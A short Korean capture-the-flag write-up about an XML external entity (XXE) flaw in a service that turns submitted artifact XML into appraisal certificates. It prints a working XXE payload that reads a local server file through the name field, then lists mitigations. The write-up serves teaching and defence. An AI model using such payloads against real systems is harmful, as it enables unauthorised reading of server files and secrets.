# 크로노스

## 취약점 요약

유물 정보를 XML로 제출하면 서버가 이를 파싱해 감정서를 생성합니다. XML 파서가 외부 엔티티를 허용해 서버 로컬 파일을 읽을 수 있었습니다.

## 가설과 검증

사용자 제공 XML이 서버에서 그대로 해석된다는 사실을 보고 XXE 가능성을 우선 검토했습니다. `name` 필드에 외부 엔티티를 참조하게 하면, 정상 감정서 출력 경로를 통해 파일 내용이 반사될 것으로 예상했습니다.

## Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE artifact [
  <!ENTITY xxe SYSTEM "secret_atlantis_log.txt">
]>
<artifact>
  <name>&xxe;</name>
  <era>청동기 시대</era>
  <origin>독일</origin>
</artifact>
```

감정서를 발급하자 엔티티가 확장되어 `secret_atlantis_log.txt` 내용이 `name` 위치에 출력됐고, 그 안에서 플래그를 확인했습니다. 원문에는 최종 플래그 문자열이 남아 있지 않습니다.

## 대응

- DTD 및 외부 엔티티 해석을 비활성화합니다.
- 네트워크 및 파일 접근을 허용하지 않는 안전한 XML 파서를 사용합니다.
- XML이 필수가 아니라면 JSON처럼 더 단순한 포맷으로 전환합니다.
- 애플리케이션 계정의 파일 권한을 최소화합니다.

